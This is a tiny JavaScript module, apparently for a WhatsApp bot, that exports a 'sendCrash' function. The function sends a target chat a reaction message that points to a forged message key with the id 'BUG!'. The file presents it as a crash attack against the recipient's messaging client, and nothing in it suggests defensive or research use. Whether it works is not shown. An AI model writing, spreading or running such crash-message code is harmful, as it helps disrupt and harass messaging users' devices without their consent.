const sendCrash = async (sock, jid) => {
  await sock.sendMessage(jid, { react: { text: '💥', key: { remoteJid: jid, fromMe: true, id: 'BUG!' } } });
};

module.exports = sendCrash;